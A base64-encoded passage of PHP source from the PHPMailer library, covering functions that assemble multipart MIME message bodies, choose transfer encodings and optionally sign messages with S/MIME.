Y29tcGxldGUgaGVhZGVycyBhbmQgYm9keS4KICAgICAqIE9ubHkgdmFsaWQgcG9zdCBwcmVTZW5kKCkuCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6cHJlU2VuZCgpCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldFNlbnRNSU1FTWVzc2FnZSgpCiAgICB7CiAgICAgICAgcmV0dXJuIHJ0cmltKCR0aGlzLT5NSU1FSGVhZGVyIC4gJHRoaXMtPm1haWxIZWFkZXIsICIKCiIpIC4gc2VsZjo6Q1JMRiAuIHNlbGY6OkNSTEYgLiAkdGhpcy0+TUlNRUJvZHk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDcmVhdGUgdW5pcXVlIElECiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2VuZXJhdGVJZCgpIHsKICAgICAgICByZXR1cm4gbWQ1KHVuaXFpZCh0aW1lKCkpKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFzc2VtYmxlIHRoZSBtZXNzYWdlIGJvZHkuCiAgICAgKiBSZXR1cm5zIGFuIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgYXNzZW1ibGVkIG1lc3NhZ2UgYm9keQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY3JlYXRlQm9keSgpCiAgICB7CiAgICAgICAgJGJvZHkgPSAnJzsKICAgICAgICAvL0NyZWF0ZSB1bmlxdWUgSURzIGFuZCBwcmVzZXQgYm91bmRhcmllcwogICAgICAgICR0aGlzLT51bmlxdWVpZCA9ICR0aGlzLT5nZW5lcmF0ZUlkKCk7CiAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzFdID0gJ2IxXycgLiAkdGhpcy0+dW5pcXVlaWQ7CiAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzJdID0gJ2IyXycgLiAkdGhpcy0+dW5pcXVlaWQ7CiAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzNdID0gJ2IzXycgLiAkdGhpcy0+dW5pcXVlaWQ7CgogICAgICAgIGlmICgkdGhpcy0+c2lnbl9rZXlfZmlsZSkgewogICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0TWFpbE1JTUUoKSAuICR0aGlzLT5MRTsKICAgICAgICB9CgogICAgICAgICR0aGlzLT5zZXRXb3JkV3JhcCgpOwoKICAgICAgICAkYm9keUVuY29kaW5nID0gJHRoaXMtPkVuY29kaW5nOwogICAgICAgICRib2R5Q2hhclNldCA9ICR0aGlzLT5DaGFyU2V0OwogICAgICAgIC8vQ2FuIHdlIGRvIGEgNy1iaXQgZG93bmdyYWRlPwogICAgICAgIGlmICgkYm9keUVuY29kaW5nID09ICc4Yml0JyBhbmQgISR0aGlzLT5oYXM4Yml0Q2hhcnMoJHRoaXMtPkJvZHkpKSB7CiAgICAgICAgICAgICRib2R5RW5jb2RpbmcgPSAnN2JpdCc7CiAgICAgICAgICAgIC8vQWxsIElTTyA4ODU5LCBXaW5kb3dzIGNvZGVwYWdlIGFuZCBVVEYtOCBjaGFyc2V0cyBhcmUgYXNjaWkgY29tcGF0aWJsZSB1cCB0byA3LWJpdAogICAgICAgICAgICAkYm9keUNoYXJTZXQgPSAndXMtYXNjaWknOwogICAgICAgIH0KICAgICAgICAvL0lmIGxpbmVzIGFyZSB0b28gbG9uZywgYW5kIHdlJ3JlIG5vdCBhbHJlYWR5IHVzaW5nIGFuIGVuY29kaW5nIHRoYXQgd2lsbCBzaG9ydGVuIHRoZW0sCiAgICAgICAgLy9jaGFuZ2UgdG8gcXVvdGVkLXByaW50YWJsZSB0cmFuc2ZlciBlbmNvZGluZyBmb3IgdGhlIGJvZHkgcGFydCBvbmx5CiAgICAgICAgaWYgKCdiYXNlNjQnICE9ICR0aGlzLT5FbmNvZGluZyBhbmQgc2VsZjo6aGFzTGluZUxvbmdlclRoYW5NYXgoJHRoaXMtPkJvZHkpKSB7CiAgICAgICAgICAgICRib2R5RW5jb2RpbmcgPSAncXVvdGVkLXByaW50YWJsZSc7CiAgICAgICAgfQoKICAgICAgICAkYWx0Qm9keUVuY29kaW5nID0gJHRoaXMtPkVuY29kaW5nOwogICAgICAgICRhbHRCb2R5Q2hhclNldCA9ICR0aGlzLT5DaGFyU2V0OwogICAgICAgIC8vQ2FuIHdlIGRvIGEgNy1iaXQgZG93bmdyYWRlPwogICAgICAgIGlmICgkYWx0Qm9keUVuY29kaW5nID09ICc4Yml0JyBhbmQgISR0aGlzLT5oYXM4Yml0Q2hhcnMoJHRoaXMtPkFsdEJvZHkpKSB7CiAgICAgICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAnN2JpdCc7CiAgICAgICAgICAgIC8vQWxsIElTTyA4ODU5LCBXaW5kb3dzIGNvZGVwYWdlIGFuZCBVVEYtOCBjaGFyc2V0cyBhcmUgYXNjaWkgY29tcGF0aWJsZSB1cCB0byA3LWJpdAogICAgICAgICAgICAkYWx0Qm9keUNoYXJTZXQgPSAndXMtYXNjaWknOwogICAgICAgIH0KICAgICAgICAvL0lmIGxpbmVzIGFyZSB0b28gbG9uZywgYW5kIHdlJ3JlIG5vdCBhbHJlYWR5IHVzaW5nIGFuIGVuY29kaW5nIHRoYXQgd2lsbCBzaG9ydGVuIHRoZW0sCiAgICAgICAgLy9jaGFuZ2UgdG8gcXVvdGVkLXByaW50YWJsZSB0cmFuc2ZlciBlbmNvZGluZyBmb3IgdGhlIGFsdCBib2R5IHBhcnQgb25seQogICAgICAgIGlmICgnYmFzZTY0JyAhPSAkYWx0Qm9keUVuY29kaW5nIGFuZCBzZWxmOjpoYXNMaW5lTG9uZ2VyVGhhbk1heCgkdGhpcy0+QWx0Qm9keSkpIHsKICAgICAgICAgICAgJGFsdEJvZHlFbmNvZGluZyA9ICdxdW90ZWQtcHJpbnRhYmxlJzsKICAgICAgICB9CiAgICAgICAgLy9Vc2UgdGhpcyBhcyBhIHByZWFtYmxlIGluIGFsbCBtdWx0aXBhcnQgbWVzc2FnZSB0eXBlcwogICAgICAgICRtaW1lcHJlID0gIlRoaXMgaXMgYSBtdWx0aS1wYXJ0IG1lc3NhZ2UgaW4gTUlNRSBmb3JtYXQuIiAuICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICBzd2l0Y2ggKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsKICAgICAgICAgICAgY2FzZSAnaW5saW5lJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGJvZHlDaGFyU2V0LCAnJywgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2lubGluZScsICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYXR0YWNoJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGJvZHlDaGFyU2V0LCAnJywgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2F0dGFjaG1lbnQnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2lubGluZV9hdHRhY2gnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCIJYm91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzJdIC4gJyInKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRib2R5Q2hhclNldCwgJycsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbMl0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYWx0JzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+SWNhbCkpIHsKICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAnJywgJ3RleHQvY2FsZW5kYXI7IG1ldGhvZD1SRVFVRVNUJywgJycpOwogICAgICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkljYWwsICR0aGlzLT5FbmNvZGluZyk7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRhbHRCb2R5Q2hhclNldCwgJ3RleHQvcGxhaW4nLCAkYWx0Qm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvcmVsYXRlZDsnKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiCWJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzJdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9hbHRlcm5hdGl2ZTsnKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiCWJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYWx0Qm9keUNoYXJTZXQsICd0ZXh0L3BsYWluJywgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkYWx0Qm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2F0dGFjaG1lbnQnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmVfYXR0YWNoJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmU7Jyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIglib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCIJYm91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzNdIC4gJyInKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbM10sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbM10pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy8gQ2F0Y2ggY2FzZSAncGxhaW4nIGFuZCBjYXNlICcnLCBhcHBsaWVzIHRvIHNpbXBsZSBgdGV4dC9wbGFpbmAgYW5kIGB0ZXh0L2h0bWxgIGJvZHkgY29udGVudCB0eXBlcwogICAgICAgICAgICAgICAgLy9SZXNldCB0aGUgYEVuY29kaW5nYCBwcm9wZXJ0eSBpbiBjYXNlIHdlIGNoYW5nZWQgaXQgZm9yIGxpbmUgbGVuZ3RoIHJlYXNvbnMKICAgICAgICAgICAgICAgICR0aGlzLT5FbmNvZGluZyA9ICRib2R5RW5jb2Rpbmc7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkdGhpcy0+RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQoKICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgewogICAgICAgICAgICAkYm9keSA9ICcnOwogICAgICAgIH0gZWxzZWlmICgkdGhpcy0+c2lnbl9rZXlfZmlsZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKCFkZWZpbmVkKCdQS0NTN19URVhUJykpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleHRlbnNpb25fbWlzc2luZycpIC4gJ29wZW5zc2wnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vIEBUT0RPIHdvdWxkIGJlIG5pY2UgdG8gdXNlIHBocDovL3RlbXAgc3RyZWFtcyBoZXJlLCBidXQgbmVlZCB0byB3cmFwIGZvciBQSFAgPCA1LjEKICAgICAgICAgICAgICAgICRmaWxlID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICdtYWlsJyk7CiAgICAgICAgICAgICAgICBpZiAoZmFsc2UgPT09IGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkYm9keSkpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdzaWduaW5nJykgLiAnIENvdWxkIG5vdCB3cml0ZSB0ZW1wIGZpbGUnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRzaWduZWQgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgJ3NpZ25lZCcpOwogICAgICAgICAgICAgICAgLy9Xb3JrYXJvdW5kIGZvciBQSFAgYnVnIGh0dHBzOi8vYnVncy5waHAubmV0L2J1Zy5waHA/aWQ9NjkxOTcKICAgICAgICAgICAgICAgIGlmIChlbXB0eSgkdGhpcy0+c2lnbl9leHRyYWNlcnRzX2ZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgJHNpZ24gPSBAb3BlbnNzbF9wa2NzN19zaWduKAogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZSwKICAgICAgICAgICAgICAgICAgICAgICAgJHNpZ25lZCwKICAgICAgICAgICAgICAgICAgICAgICAgJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fY2VydF9maWxlKSwKICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkoJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpLCAkdGhpcy0+c2lnbl9rZXlfcGFzcyksCiAgICAgICAgICAgICAgICAgICAgICAgIG51bGwKICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkc2lnbiA9IEBvcGVuc3NsX3BrY3M3X3NpZ24oCiAgICAgICAgICAgICAgICAgICAgICAgICRmaWxlLAogICAgICAgICAgICAgICAgICAgICAgICAkc2lnbmVkLAogICAgICAgICAgICAgICAgICAgICAgICAnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9jZXJ0X2ZpbGUpLAogICAgICAgICAgICAgICAgICAgICAgICBhcnJheSgnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9rZXlfZmlsZSksICR0aGlzLT5zaWduX2tleV9wYXNzKSwKICAgICAgICAgICAgICAgICAgICAgICAgbnVsbCwKICAgICAgICAgICAgICAgICAgICAgICAgUEtDUzdfREVUQUNIRUQsCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5zaWduX2V4dHJhY2VydHNfZmlsZQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJHNpZ24pIHsKICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRmaWxlKTsKICAgICAgICAgICAgICAgICAgICAkYm9keSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRzaWduZWQpOwogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJHNpZ25lZCk7CiAgICAgICAgICAgICAgICAgICAgLy9UaGUgbWVzc2FnZSByZXR1cm5lZCBieSBvcGVuc3NsIGNvbnRhaW5zIGJvdGggaGVhZGVycyBhbmQgYm9keSwgc28gbmVlZCB0byBzcGxpdCB0aGVtIHVwCiAgICAgICAgICAgICAgICAgICAgJHBhcnRzID0gZXhwbG9kZSgiCgoiLCAkYm9keSwgMik7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgLj0gJHBhcnRzWzBdIC4gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgICAgICRib2R5ID0gJHBhcnRzWzFdOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRmaWxlKTsKICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRzaWduZWQpOwogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3NpZ25pbmcnKSAuIG9wZW5zc2xfZXJyb3Jfc3RyaW5nKCkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAgICAgJGJvZHkgPSAnJzsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgICAgIHRocm93ICRleGM7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuICRib2R5OwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBzdGFydCBvZiBhIG1lc3NhZ2UgYm91bmRhcnkuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHBhcmFtIHN0cmluZyAkYm91bmRhcnkKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNoYXJTZXQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNvbnRlbnRUeXBlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldEJvdW5kYXJ5KCRib3VuZGFyeSwgJGNoYXJTZXQsICRjb250ZW50VHlwZSwgJGVuY29kaW5nKQogICAgewogICAgICAgICRyZXN1bHQgPSAnJzsKICAgICAgICBpZiAoJGNoYXJTZXQgPT0gJycpIHsKICAgICAgICAgICAgJGNoYXJTZXQgPSAkdGhpcy0+Q2hhclNldDsKICAgICAgICB9CiAgICAgICAgaWYgKCRjb250ZW50VHlwZSA9PSAnJykgewogICAgICAgICAgICAkY29udGVudFR5cGUgPSAkdGhpcy0+Q29udGVudFR5cGU7CiAgICAgICAgfQogICAgICAgIGlmICgkZW5jb2RpbmcgPT0gJycpIHsKICAgICAgICAgICAgJGVuY29kaW5nID0gJHRoaXMtPkVuY29kaW5nOwogICAgICAgIH0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJGJvdW5kYXJ5KTsKICAgICAgICAkcmVzdWx0IC49IHNwcmludGYoJ0NvbnRlbnQtVHlwZTogJXM7IGNoYXJzZXQ9JXMnLCAkY29udGVudFR5cGUsICRjaGFyU2V0KTsKICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5MRTsKICAgICAgICAvLyBSRkMxMzQxIHBhcnQgNSBzYXlzIDdiaXQgaXMgYXNzdW1lZCBpZiBub3Qgc3BlY2lmaWVkCiAgICAgICAgaWYgKCRlbmNvZGluZyAhPSAnN2JpdCcpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1Ucm